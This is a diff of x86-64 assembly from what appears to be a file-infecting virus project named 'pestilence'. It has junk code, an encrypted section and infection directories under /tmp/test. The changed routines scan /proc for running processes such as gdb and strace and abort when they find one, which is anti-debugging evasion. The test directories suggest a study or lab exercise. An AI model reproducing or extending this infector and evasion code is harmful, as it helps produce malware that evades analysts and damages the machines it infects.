@@ -58,7 +58,7 @@ pop rax
 mov rdi, rax
 add rdi, rdx
 cmp rdi, 0x256
-jge die
+je die
 ; END JUNK CODE
 
 		call findDaemonProcess
@@ -537,7 +537,6 @@ add rsp, 8
 ; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 isDaemon:
 		push r8
-		push r9
 
 ; Concatenate "/proc/", the processID, and the comm filename
 .getFilePath:
@@ -602,18 +601,18 @@ add rsp, 8
 ; Check if current process is forbidden
 ; RDI => Forbidden process
 .isForbidden:
-		mov r9, rdi
-
 		; Get forbidden process length
 		call ft_strlen
 		mov rcx, rax
 
 		; Check if forbidden process name is in buffer
+		push rdi
+		mov rdx, rdi
+		; RCX => length of process name
 		lea rdi, VALUE(s_pestilence.file_path)
 		mov rsi, 32
-		mov rdx, r9
-		; RCX => length of process name
 		call ft_memmem
+		pop rdi
 
 		cmp rax, 0
 		jnz .close
@@ -621,7 +620,6 @@ add rsp, 8
 .nextForbidden:
 		mov al, 0
 		mov ecx, -1
-		mov rdi, r9
 		repnz scasb
 		cmp byte [rdi], 0
 		jnz .isForbidden
@@ -635,7 +633,6 @@ add rsp, 8
 		pop rax
 
 .return:
-		pop r9
 		pop r8
 		ret
 
@@ -802,7 +799,7 @@ ft_strlen:
 infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
 processDirectory: db "/proc/", 0
 processStatFile: db "/comm", 0
-daemonName: db "daemon\n", 0, "gdb\n", 0, "strace\n", 0, 0
+daemonName: db "testProcess", 10, 0, "gdb", 10, 0, "strace", 10, 0, 0
 debugMessage: db "DEBUGGING", 0
 
 ; Encryption ends here
